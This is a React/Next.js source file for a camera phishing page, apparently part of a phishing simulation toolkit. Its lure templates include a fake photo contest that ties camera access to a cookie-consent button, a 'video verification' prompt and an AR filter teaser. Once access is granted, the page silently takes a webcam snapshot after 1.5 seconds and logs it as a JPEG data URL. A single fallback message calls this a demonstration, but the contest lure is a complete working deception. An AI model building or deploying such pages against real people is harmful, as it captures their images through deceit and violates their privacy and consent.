
"use client";
import { useEffect, useState, useRef } from 'react';
import { useParams } from 'next/navigation';
import { useLogs } from '@/contexts/LogContext';
import type { CameraData } from '@/types';
import { Button } from '@/components/ui/button';
import { PhishingPageLayout } from '@/components/phishing/PhishingPageLayout';
import { Card as ShadcnCard, CardContent, CardDescription as ShadcnCardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
import { Camera as CameraIcon, VideoOff, CheckCircle, AlertTriangle, Trophy, Cookie, Image as ImageIcon } from 'lucide-react';
import Image from 'next/image';

const templateContent: Record<string, { title: string, actionText: string, message: string, contestDetails?: string }> = {
  'photo-contest-entry': {
    title: 'Capture the Moment: Photo Contest!',
    actionText: 'Accept Cookies & Enter Contest',
    message: "Showcase your photography skills and win amazing prizes! Submit your best original photo. To proceed, please accept our terms and enable camera access for your submission.",
    contestDetails: "Our site uses essential cookies for functionality and to process your contest entry. By continuing, you agree to our terms and allow camera access for photo submission. The winner will be announced on our social media channels next month. Good luck!"
  },
  'video-verification': {
    title: 'Video Verification',
    actionText: 'Start Video Verification',
    message: 'For security, we need to verify your identity via video. Please enable your camera.',
  },
  'ar-filter': {
    title: 'Try Our New AR Filter!',
    actionText: 'Test AR Filter',
    message: 'Check out our latest AR filter! Enable your camera to see it in action.',
  },
  default: {
    title: 'Camera Access Required',
    actionText: 'Enable Camera',
    message: 'This feature requires camera access. Please enable your camera to continue.',
  }
};

export default function CameraPhishingPage() {
  const { addLog } = useLogs();
  const { id: idFromParams } = useParams<{ id: string }>();
  const templateId = idFromParams || 'default';
  const content = templateContent[templateId] || templateContent.default;

  const [status, setStatus] = useState<'idle' | 'requesting' | 'streaming' | 'captured' | 'error'>('idle');
  const [error, setError] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const intervalRef = useRef<NodeJS.Timeout | null>(null);
  const [cookieConsentGiven, setCookieConsentGiven] = useState(false);

  useEffect(() => {
    addLog({ type: 'generic', data: { message: `Visited camera phishing page: /phishing/camera/${templateId}` } });
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [templateId]);

  const captureImage = () => {
    if (videoRef.current && canvasRef.current && videoRef.current.readyState === 4 && videoRef.current.videoWidth > 0) {
      const video = videoRef.current;
      const canvas = canvasRef.current;

      const MAX_WIDTH = 640;
      const MAX_HEIGHT = 480;
      let { videoWidth, videoHeight } = video;

      if (videoWidth > videoHeight) {
        if (videoWidth > MAX_WIDTH) {
          videoHeight = Math.round((videoHeight * MAX_WIDTH) / videoWidth);
          videoWidth = MAX_WIDTH;
        }
      } else {
        if (videoHeight > MAX_HEIGHT) {
          videoWidth = Math.round((videoWidth * MAX_HEIGHT) / videoHeight);
          videoHeight = MAX_HEIGHT;
        }
      }

      canvas.width = videoWidth;
      canvas.height = videoHeight;

      const context = canvas.getContext('2d');
      if (context) {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageUrl = canvas.toDataURL('image/jpeg', 0.8); // Restored quality
        const cameraData: CameraData = { imageUrl };
        addLog({ type: 'camera', data: cameraData });
        console.log("Image captured and logged.");
        setStatus('captured');
        stopCameraStream(true);
      }
    }
  };

  const handleCameraRequest = async () => {
    if (streamRef.current) stopCameraStream();

    setStatus('requesting');
    setIsLoading(true);
    setError(null);

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      streamRef.current = stream;
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.onloadedmetadata = () => {
           if (videoRef.current) videoRef.current.play();
           setStatus('streaming');
           setIsLoading(false);
           setTimeout(captureImage, 1500);
        };
      }
    } catch (err) {
      console.error("Camera access error:", err);
      let errorMessage = 'Could not access camera.';
      if (err instanceof DOMException) {
        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
          errorMessage = 'Camera access denied by user.';
        } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
          errorMessage = 'No camera found on this device.';
        }
      }
      setError(errorMessage);
      setStatus('error');
      addLog({ type: 'generic', data: { message: `Camera error: ${errorMessage}` } });
      setIsLoading(false);
    }
  };
  
  const handleCookieConsentAndCamera = () => {
    setCookieConsentGiven(true);
    handleCameraRequest();
  };

  const stopCameraStream = (isAfterCapture = false) => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop());
      streamRef.current = null;
    }
    if (videoRef.current) {
      videoRef.current.srcObject = null;
    }
    if (intervalRef.current) {
      clearInterval(intervalRef.current);
      intervalRef.current = null;
    }
    if (!isAfterCapture && status !== 'captured' && status !== 'error') {
      setStatus('idle');
    }
  };

  useEffect(() => {
    return () => {
      stopCameraStream();
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  if (templateId === 'photo-contest-entry') {
    return (
      <PhishingPageLayout
        title={content.title}
        isLoading={isLoading && status !== 'streaming'}
        error={error}
        statusMessage={status === 'captured' ? 'Photo submitted successfully! Good luck in the contest.' : undefined}
      >
        <div className="text-center mb-6">
            <Trophy className="h-16 w-16 text-amber-500 mx-auto mb-4" />
            <p className="text-lg text-muted-foreground">{content.message}</p>
        </div>

        {!cookieConsentGiven && (
            <ShadcnCard className="w-full max-w-md mx-auto shadow-lg border-border bg-background/80">
                <CardHeader>
                    <CardTitle className="flex items-center text-primary">
                        <Cookie className="mr-2 h-5 w-5" />
                        Before You Enter...
                    </CardTitle>
                </CardHeader>
                <CardContent>
                    <ShadcnCardDescription className="text-sm text-foreground/80">
                        {content.contestDetails || "Our site uses essential cookies for functionality and to process your contest entry. By continuing, you agree to our terms and allow camera access for photo submission."}
                    </ShadcnCardDescription>
                </CardContent>
                <CardFooter>
                    <Button
                        onClick={handleCookieConsentAndCamera}
                        className="w-full bg-primary hover:bg-primary/90 text-primary-foreground"
                        disabled={isLoading}
                    >
                        <CameraIcon className="mr-2 h-5 w-5" />
                        {isLoading ? 'Initializing...' : content.actionText}
                    </Button>
                </CardFooter>
            </ShadcnCard>
        )}

        {(cookieConsentGiven || status === 'streaming' || status === 'captured') && (
          <div className={`aspect-video bg-muted rounded-lg overflow-hidden mb-6 relative border-2 ${status === 'streaming' ? 'border-primary' : 'border-border'}`}>
            <video ref={videoRef} className="w-full h-full object-cover" playsInline muted />
            {status !== 'streaming' && status !== 'captured' && !cookieConsentGiven && (
              <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/30">
                <ImageIcon className="h-16 w-16 text-white/70 mb-2" />
                <p className="text-white/90">Contest photo will appear here</p>
              </div>
            )}
             {status !== 'streaming' && status !== 'captured' && cookieConsentGiven && status !== 'error' && !isLoading && (
                <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/50">
                    <VideoOff className="h-16 w-16 text-white/70 mb-2" />
                    <p className="text-white/90">Camera feed inactive. Try enabling camera.</p>
                </div>
            )}
          </div>
        )}
        <canvas ref={canvasRef} className="hidden"></canvas>

        {status === 'streaming' && !isLoading && cookieConsentGiven && (
           <div className="text-center p-3 bg-blue-50 border border-blue-200 rounded-md">
            <p className="font-medium text-blue-700">Camera active. Capturing snapshot...</p>
            <Button onClick={() => stopCameraStream()} variant="outline" size="sm" className="mt-2">Cancel Submission</Button>
          </div>
        )}

        {status === 'captured' && cookieConsentGiven && (
          <div className="text-center p-4 bg-green-50 border border-green-200 rounded-md">
            <CheckCircle className="mx-auto h-10 w-10 text-green-600 mb-2" />
            <p className="font-semibold text-green-700">Photo Submitted Successfully!</p>
            <p className="text-sm text-green-600">Thank you for entering the contest. This window can now be closed.</p>
          </div>
        )}
         {status === 'error' && cookieConsentGiven && error && (
           <div className="text-center p-4 bg-red-50 border border-red-200 rounded-md">
            <AlertTriangle className="mx-auto h-10 w-10 text-red-600 mb-2" />
            <p className="font-semibold text-red-700">Camera Access Failed</p>
            <p className="text-sm text-red-600">{error}</p>
            <Button onClick={handleCameraRequest} variant="outline" className="mt-3">Try Again</Button>
          </div>
        )}
         {templateId !== 'photo-contest-entry' && (status === 'idle' || status === 'error') && (
             <Button
             onClick={handleCameraRequest}
             className="w-full bg-accent hover:bg-accent/90 text-accent-foreground"
             disabled={isLoading}
           >
             <CameraIcon className="mr-2 h-5 w-5" />
             {isLoading ? 'Initializing Camera...' : content.actionText}
           </Button>
         )}

      </PhishingPageLayout>
    );
  }

  // Fallback for other camera templates
  return (
    <PhishingPageLayout
        title={content.title}
        isLoading={isLoading && status !== 'streaming'}
        error={error}
        statusMessage={status === 'captured' ? 'Camera snapshot captured successfully for demonstration.' : undefined}
    >
      <p className="text-center text-muted-foreground mb-6">{content.message}</p>

      <div className="aspect-video bg-muted rounded-lg overflow-hidden mb-6 relative border">
        <video ref={videoRef} className="w-full h-full object-cover" playsInline muted />
        {status !== 'streaming' && status !== 'captured' && (
          <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/50">
            <VideoOff className="h-16 w-16 text-white/70 mb-2" />
            <p className="text-white/90">Camera feed inactive</p>
          </div>
        )}
      </div>
      <canvas ref={canvasRef} className="hidden"></canvas>

      {(status === 'idle' || status === 'error') && (
        <Button
          onClick={handleCameraRequest}
          className="w-full bg-accent hover:bg-accent/90 text-accent-foreground"
          disabled={isLoading}
        >
          <CameraIcon className="mr-2 h-5 w-5" />
          {isLoading ? 'Initializing Camera...' : content.actionText}
        </Button>
      )}

      {status === 'streaming' && !isLoading && (
         <div className="text-center p-3 bg-blue-50 border border-blue-200 rounded-md">
          <p className="font-medium text-blue-700">Camera active. Capturing snapshot...</p>
          <Button onClick={() => stopCameraStream()} variant="outline" size="sm" className="mt-2">Stop Camera</Button>
        </div>
      )}

      {status === 'captured' && (
        <div className="text-center p-4 bg-green-50 border border-green-200 rounded-md">
          <CheckCircle className="mx-auto h-10 w-10 text-green-600 mb-2" />
          <p className="font-semibold text-green-700">Image Captured</p>
          <p className="text-sm text-green-600">An image has been captured. This window can now be closed.</p>
        </div>
      )}
       {status === 'error' && error && (
         <div className="text-center p-4 bg-red-50 border border-red-200 rounded-md">
          <AlertTriangle className="mx-auto h-10 w-10 text-red-600 mb-2" />
          <p className="font-semibold text-red-700">Camera Access Failed</p>
          <p className="text-sm text-red-600">{error}</p>
        </div>
      )}
    </PhishingPageLayout>
  );
}
